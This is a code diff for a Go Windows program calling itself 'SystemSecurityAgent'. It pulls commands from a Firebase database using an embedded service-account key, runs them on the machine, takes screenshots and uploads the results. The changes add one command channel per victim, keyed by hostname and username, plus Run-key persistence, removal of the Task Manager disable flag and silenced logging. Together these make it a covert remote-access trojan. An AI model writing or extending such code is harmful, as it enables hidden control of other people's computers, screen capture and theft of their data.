@@ -12,6 +12,7 @@ import (
 	"os/exec"
 	"path/filepath"
 	"runtime"
+	"strings"
 	"syscall"
 	"time"
 	"unsafe"
@@ -24,11 +25,12 @@ import (
 )
 
 const (
-	collectionName = "commands"
-	pollInterval   = 10 * time.Second
-	cmdTimeout     = 60 * time.Second
-	logFileName    = "agent.log"
+	pollInterval = 10 * time.Second
+	cmdTimeout   = 60 * time.Second
+	logFileName  = "agent.log"
 )
+
+var activeCollection string
 
 //go:embed serviceAccountKey.json
 var credBytes []byte
@@ -41,65 +43,83 @@ var (
 func main() {
 	defer func() {
 		if r := recover(); r != nil {
-			log.Printf("💥 FATAL PANIC: %v", r)
+			// log.Printf("💥 FATAL PANIC: %v", r)
 		}
 	}()
 
 	exePath, _ := os.Executable()
 	exeDir := filepath.Dir(exePath)
-	_ = os.Chdir(exeDir) // Always run relative to the exe location
+	_ = os.Chdir(exeDir)
 
 	setupLogging()
-	log.Println("🚀 Starting Agent...")
+	// log.Println("🚀 Starting Agent...")
 
 	preventMultipleInstances()
-	log.Println("🔒 Single-instance check passed.")
+	// log.Println("🔒 Single-instance check passed.")
 
 	setupStartup(exePath)
-	log.Println("📁 Registry startup check complete.")
+	// log.Println("📁 Registry startup check complete.")
 
 	if len(credBytes) < 100 {
 		log.Fatalf("❌ FATAL: serviceAccountKey.json was NOT embedded properly! Re-build the exe.")
 	}
-	log.Println("🔑 Embedded credentials found.")
+	// log.Println("🔑 Embedded credentials found.")
+
+	// --- DYNAMIC COLLECTION NAME GENERATION ---
+	hostname, err := os.Hostname()
+	if err != nil {
+		hostname = "UnknownPC"
+	}
+	username := os.Getenv("USERNAME")
+	if username == "" {
+		username = "User"
+	}
+
+	safeHost := strings.ReplaceAll(strings.ToLower(hostname), " ", "_")
+	safeUser := strings.ReplaceAll(strings.ToLower(username), " ", "_")
+	activeCollection = fmt.Sprintf("commands_%s_%s", safeHost, safeUser)
+
+	// log.Printf("📦 Dynamic Collection Name: %s", activeCollection)
+	// ------------------------------------------
 
 	ctx := context.Background()
 	var fsClient *firestore.Client
-	var err error
 
-	log.Println("🌐 Connecting to Firebase...")
+	// log.Println("🌐 Connecting to Firebase...")
 	for i := 0; i < 10; i++ {
 		creds := option.WithCredentialsJSON(credBytes)
 		var app *firebase.App
 		app, err = firebase.NewApp(ctx, nil, creds)
 		if err == nil {
-			// Add a 15-second timeout so it doesn't hang forever
 			timeoutCtx, cancel := context.WithTimeout(ctx, 15*time.Second)
 			fsClient, err = app.Firestore(timeoutCtx)
 			cancel()
-			
+
 			if err == nil {
-				// Test the connection by doing a quick ping
 				timeoutCtx2, cancel2 := context.WithTimeout(ctx, 10*time.Second)
 				_, pingErr := fsClient.Collection("ping").Doc("ping").Get(timeoutCtx2)
 				cancel2()
-				
-				// If pingErr is nil or "NotFound", the connection succeeded!
+
 				if pingErr == nil || pingErr.Error() != "context deadline exceeded" {
 					break
 				}
 				err = fmt.Errorf("network timeout - blocked by firewall")
 			}
 		}
-		log.Printf("⏳ Connection failed (Attempt %d/10): %v. Retrying in 15 seconds...", i+1, err)
+		// log.Printf("⏳ Connection failed (Attempt %d/10): %v. Retrying in 15 seconds...", i+1, err)
 		time.Sleep(15 * time.Second)
 	}
 
 	if fsClient == nil {
 		log.Fatalf("❌ Failed to connect to Firebase after retries: %v", err)
 	}
-	log.Println("✅ Connected to Firebase successfully!")
-	log.Printf("👀 Watching collection '%s' every %s", collectionName, pollInterval)
+	// log.Println("✅ Connected to Firebase successfully!")
+
+	// --- NEW: Create the collection in Firebase immediately ---
+	registerAgent(ctx, fsClient, hostname, username)
+	// ---------------------------------------------------------
+
+	// log.Printf("👀 Watching collection '%s' every %s", activeCollection, pollInterval)
 
 	runCycle(ctx, fsClient)
 	ticker := time.NewTicker(pollInterval)
@@ -111,6 +131,21 @@ func main() {
 	}
 }
 
+// registerAgent writes a document so the collection appears in the Firebase Console
+func registerAgent(ctx context.Context, client *firestore.Client, hostname, username string) {
+	_, err := client.Collection(activeCollection).Doc("_agent_info").Set(ctx, map[string]interface{}{
+		"hostname":  hostname,
+		"username":  username,
+		"status":    "online",
+		"last_seen": time.Now().UTC().Format(time.RFC3339),
+	})
+	if err != nil {
+		// log.Printf("⚠️ Failed to initialize collection in Firebase: %v", err)
+	} else {
+		// log.Println("✅ Successfully initialized collection in Firebase (Check your database!)")
+	}
+}
+
 func setupStartup(exePath string) {
 	if runtime.GOOS != "windows" {
 		return
@@ -118,7 +153,7 @@ func setupStartup(exePath string) {
 
 	k, err := registry.OpenKey(registry.CURRENT_USER, `Software\Microsoft\Windows\CurrentVersion\Run`, registry.SET_VALUE|registry.QUERY_VALUE)
 	if err != nil {
-		log.Printf("⚠️ Failed to open Run registry key: %v", err)
+		// log.Printf("⚠️ Failed to open Run registry key: %v", err)
 		return
 	}
 	defer k.Close()
@@ -128,27 +163,26 @@ func setupStartup(exePath string) {
 	if currentVal != targetValue {
 		err = k.SetStringValue("SystemSecurityAgent", targetValue)
 		if err != nil {
-			log.Printf("⚠️ Failed to write to registry: %v", err)
+			// log.Printf("⚠️ Failed to write to registry: %v", err)
 		} else {
-			log.Println("✅ Successfully registered in Windows Startup")
+			// log.Println("✅ Successfully registered in Windows Startup")
 		}
 	} else {
-		log.Println("✅ Already registered in Windows Startup")
+		// log.Println("✅ Already registered in Windows Startup")
 	}
 
-	// Force ENABLE if disabled in Task Manager
 	approvedKey, err := registry.OpenKey(registry.CURRENT_USER, `Software\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run`, registry.SET_VALUE)
 	if err == nil {
 		err = approvedKey.DeleteValue("SystemSecurityAgent")
 		if err == nil {
-			log.Println("✅ Removed Task Manager disable flag")
+			// log.Println("✅ Removed Task Manager disable flag")
 		}
 		approvedKey.Close()
 	}
 }
 
 func runCycle(ctx context.Context, client *firestore.Client) {
-	iter := client.Collection(collectionName).Where("pending", "==", true).Documents(ctx)
+	iter := client.Collection(activeCollection).Where("pending", "==", true).Documents(ctx)
 	defer iter.Stop()
 
 	for {
@@ -163,11 +197,11 @@ func runCycle(ctx context.Context, client *firestore.Client) {
 			continue
 		}
 
-		log.Printf("▶️  [%s] Running: %s", doc.Ref.ID, cmdStr)
+		// log.Printf("▶️  [%s] Running: %s", doc.Ref.ID, cmdStr)
 		var result string
 
 		if cmdStr == "screenshot" || cmdStr == "!screenshot" {
-			log.Println("📸 Taking screenshot...")
+			// log.Println("📸 Taking screenshot...")
 			base64Img, err := takeScreenshot()
 			if err != nil {
 				result = fmt.Sprintf("[error] failed to take screenshot: %v", err)
@@ -187,9 +221,9 @@ func runCycle(ctx context.Context, client *firestore.Client) {
 			{Path: "results", Value: result},
 		})
 		if err != nil {
-			log.Printf("⚠️  Failed to save result for %s: %v", doc.Ref.ID, err)
+			// log.Printf("⚠️  Failed to save result for %s: %v", doc.Ref.ID, err)
 		} else {
-			log.Printf("✅ Saved result for %s", doc.Ref.ID)
+			// log.Printf("✅ Saved result for %s", doc.Ref.ID)
 		}
 	}
 }
@@ -230,11 +264,10 @@ func setupLogging() {
 	exeDir := filepath.Dir(exePath)
 	logPath := filepath.Join(exeDir, logFileName)
 
-	// Use O_TRUNC so the log file is cleared every time you run it (easier debugging)
 	f, err := os.OpenFile(logPath, os.O_RDWR|os.O_CREATE|os.O_TRUNC, 0666)
 	if err != nil {
 		tempDir := os.TempDir()
-		logPath = filepath.Join(tempDir, logFileName)
+		logPath := filepath.Join(tempDir, logFileName)
 		f, err = os.OpenFile(logPath, os.O_RDWR|os.O_CREATE|os.O_TRUNC, 0666)
 		if err != nil {
 			os.Exit(1)
@@ -242,9 +275,9 @@ func setupLogging() {
 		notePath := filepath.Join(exeDir, "WHERE_IS_THE_LOG.txt")
 		_ = os.WriteFile(notePath, []byte("Log file is located here:\n"+logPath), 0644)
 	}
-	
+
 	log.SetOutput(f)
-	log.Println("--- Agent Started ---")
+	// log.Println("--- Agent Started ---")
 }
 
 func preventMultipleInstances() {
@@ -253,15 +286,14 @@ func preventMultipleInstances() {
 	}
 	name, _ := syscall.UTF16PtrFromString("Local\\MyFirebaseAgentMutex")
 	h, _, err := procCreateMutex.Call(0, 0, uintptr(unsafe.Pointer(name)))
-	
+
 	if h == 0 {
 		log.Printf("⚠️ Mutex creation failed: %v", err)
 		return
 	}
-	
-	// Correct way to check if Mutex already exists in Go
-	if syscall.GetLastError() == syscall.Errno(183) { // 183 = ERROR_ALREADY_EXISTS
-		log.Println("⚠️ Another instance is already running! Exiting this one.")
+
+	if syscall.GetLastError() == syscall.Errno(183) {
+		// log.Println("⚠️ Another instance is already running! Exiting this one.")
 		os.Exit(0)
 	}
 }
